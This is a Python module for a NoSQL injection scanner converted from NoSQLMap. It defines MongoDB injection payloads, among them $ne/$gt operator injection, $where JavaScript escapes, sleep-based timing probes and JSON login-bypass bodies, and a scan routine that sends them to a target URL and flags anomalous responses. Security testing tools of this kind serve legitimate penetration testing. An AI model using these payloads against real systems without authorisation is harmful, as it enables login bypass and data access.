"""
NoSQL injection engine — NoSQLMap-class conversion (codingo/NoSQLMap).

Covers MongoDB-oriented web injection patterns from nsmweb.py:
  - PHP/Express != associative array
  - $ne / $gt / $nin operator injection
  - $where string/integer escape
  - this != injection
  - timing-oriented $where sleep variants (detection via response delta)
"""

from __future__ import annotations

from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from .._http import http_request, redact_url
from .. import policy

# Payloads derived from NoSQLMap nsmweb.py test cases 1–8 + modern operator forms
PAYLOADS: list[dict[str, Any]] = [
    {"id": "ne-empty", "payload": {"$ne": ""}, "style": "json", "test": "operator", "source": "NoSQLMap"},
    {"id": "ne-null", "payload": {"$ne": None}, "style": "json", "test": "operator", "source": "NoSQLMap"},
    {"id": "gt", "payload": {"$gt": ""}, "style": "json", "test": "operator", "source": "NoSQLMap"},
    {"id": "nin", "payload": {"$nin": []}, "style": "json", "test": "operator", "source": "NoSQLMap"},
    {"id": "regex", "payload": {"$regex": ".*"}, "style": "json", "test": "operator", "source": "NoSQLMap"},
    {"id": "ne-param", "payload": "[$ne]=", "style": "query", "test": "php-array", "source": "NoSQLMap"},
    {"id": "gt-param", "payload": "[$gt]=", "style": "query", "test": "php-array", "source": "NoSQLMap"},
    {"id": "ne-true", "payload": "true,$ne", "style": "raw", "test": "php-array", "source": "NoSQLMap"},
    {"id": "where-str", "payload": "' || this.password.match(/.*/)//+ +", "style": "raw", "test": "where", "source": "NoSQLMap"},
    {"id": "where-int", "payload": "1; return true; var x = 1", "style": "raw", "test": "where", "source": "NoSQLMap"},
    {"id": "where-sleep", "payload": "'; return sleep(2000) || true; var x='", "style": "raw", "test": "time", "source": "NoSQLMap"},
    {"id": "this-ne-str", "payload": "'; return this.a != 'x'; var dummy='", "style": "raw", "test": "where", "source": "NoSQLMap"},
    {"id": "or-true", "payload": "' || '1'=='1", "style": "raw", "test": "logic", "source": "NoSQLMap"},
    {"id": "or-true2", "payload": '" || "1"=="1', "style": "raw", "test": "logic", "source": "NoSQLMap"},
    {"id": "null-auth", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}, "style": "json-body", "test": "auth-bypass", "source": "NoSQLMap"},
    {"id": "gt-auth", "payload": {"username": {"$gt": ""}, "password": {"$gt": ""}}, "style": "json-body", "test": "auth-bypass", "source": "NoSQLMap"},
]


def list_payloads() -> dict[str, Any]:
    return {
        "ok": True,
        "count": len(PAYLOADS),
        "payloads": PAYLOADS,
        "source": "codingo/NoSQLMap nsmweb.py",
        "engine": "nosql",
        "equivalent": "NoSQLMap",
    }


def list_payloads_pat() -> dict[str, Any]:
    try:
        from .. import pat_data
        rows = pat_data.get("nosql")
        return {"ok": True, "payloads": rows, "count": len(rows), "source": "PayloadsAllTheThings"}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def _apply_query(url: str, param: str, payload: Any, style: str) -> tuple[str, str | None, dict | None]:
    """Return (url, body, extra_headers)."""
    p = urlparse(url)
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    if style == "json":
        # encode as param[$ne]=value form preferred by PHP
        if isinstance(payload, dict):
            for k, v in payload.items():
                params[f"{param}[{k}]"] = "" if v is None else str(v)
            params.pop(param, None)
        q = urlencode(params)
        return urlunparse((p.scheme, p.netloc, p.path, p.params, q, p.fragment)), None, None
    if style == "query":
        # payload is suffix like [$ne]=
        params.pop(param, None)
        # manual
        base = urlencode(params)
        extra = f"{param}{payload}"
        q = f"{base}&{extra}" if base else extra
        return urlunparse((p.scheme, p.netloc, p.path, p.params, q, p.fragment)), None, None
    if style == "raw":
        params[param] = str(payload)
        q = urlencode(params)
        return urlunparse((p.scheme, p.netloc, p.path, p.params, q, p.fragment)), None, None
    if style == "json-body":
        import json
        return url, json.dumps(payload), {"Content-Type": "application/json"}
    params[param] = str(payload)
    q = urlencode(params)
    return urlunparse((p.scheme, p.netloc, p.path, p.params, q, p.fragment)), None, None


async def scan(
    url: str,
    parameter: str = "",
    max_payloads: int = 8,
    user_agent: str = "pyodide-security/nosqlmap/1.0",
    timeout_ms: int = 8000,
    retries: int = 0,
    retry_statuses: str = "408,429,500,502,503,504",
    route: str = "auto",
    include_attempts: bool = True,
) -> dict[str, Any]:
    err = policy.check_url_for_active(url) if hasattr(policy, "check_url_for_active") else None
    if err:
        return {"ok": False, "error": err, "engine": "nosql"}
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    p = urlparse(url)
    params = dict(parse_qsl(p.query, keep_blank_values=True))
    param = parameter
    if not param:
        for c in ("user", "username", "pass", "password", "id", "search", "q", "filter"):
            if c in params:
                param = c
                break
        if not param and params:
            param = next(iter(params))
        if not param:
            param = "id"

    payloads = PAYLOADS
    if max_payloads and max_payloads > 0:
        payloads = payloads[: int(max_payloads)]

    headers = {"User-Agent": user_agent}
    timeout = max(1000, min(int(timeout_ms or 8000), 120000))
    retry_count = max(0, min(int(retries or 0), 5))
    route_name = route if route in ("auto", "proxy", "direct") else "auto"
    use_proxy = True if route_name == "proxy" else False if route_name == "direct" else None
    retry_codes = {int(item.strip()) for item in str(retry_statuses or "").split(",") if item.strip().isdigit()}
    attempts: list[dict[str, Any]] = []

    async def request(target: str, method: str = "GET", request_headers: dict[str, str] | None = None, body: str | None = None) -> dict[str, Any]:
        response: dict[str, Any] = {}
        for _ in range(retry_count + 1):
            response = await http_request(target, method=method, headers=request_headers or headers, body=body, timeout_ms=timeout, use_proxy=use_proxy)
            attempts.append({"attempt": len(attempts) + 1, "url": redact_url(target), "status": response.get("status"), "ok": response.get("ok"), "transport": response.get("transport"), "elapsed_ms": response.get("elapsed_ms"), "error": str(response.get("error") or "")[:240]})
            if response.get("ok") or int(response.get("status") or 0) not in retry_codes:
                break
        return response

    base = await request(url)
    base_len = len(base.get("body") or "")
    base_status = base.get("status")
    findings = []
    tested = 0
    for pl in payloads:
        if not policy.can_request():
            break
        tested += 1
        test_url, body, extra_h = _apply_query(url, param, pl["payload"], pl["style"])
        h = dict(headers)
        if extra_h:
            h.update(extra_h)
        method = "POST" if body is not None else "GET"
        resp = await request(test_url, method=method, request_headers=h, body=body)
        bl = len(resp.get("body") or "")
        st = resp.get("status")
        delta = abs(bl - base_len)
        interesting = False
        reason = []
        if st != base_status and st not in (0, None):
            interesting = True
            reason.append(f"status {base_status}->{st}")
        if delta > max(50, int(base_len * 0.1)):
            interesting = True
            reason.append(f"len_delta={delta}")
        body_l = (resp.get("body") or "").lower()
        for err_sig in ("mongo", "bson", "mongodb", "syntaxerror", "unexpected token", "$where", "cannot use"):
            if err_sig in body_l and err_sig not in (base.get("body") or "").lower():
                interesting = True
                reason.append(f"error:{err_sig}")
        if interesting:
            findings.append({
                "id": pl["id"],
                "test": pl["test"],
                "payload": pl["payload"],
                "style": pl["style"],
                "status": st,
                "length": bl,
                "reasons": reason,
            })
    return {
        "ok": True,
        "url": redact_url(url),
        "parameter": param,
        "tested": tested,
        "findings": findings,
        "finding_count": len(findings),
        "vulnerable": bool(findings),
        "baseline": {"status": base_status, "length": base_len},
        "engine": "nosql",
        "equivalent": "NoSQLMap",
        "source": "codingo/NoSQLMap",
        "request": {"timeout_ms": timeout, "retries": retry_count, "retry_statuses": sorted(retry_codes), "route": route_name, "headers": {"User-Agent": user_agent}},
        "attempts": attempts if include_attempts else [],
        "attempt_count": len(attempts),
    }
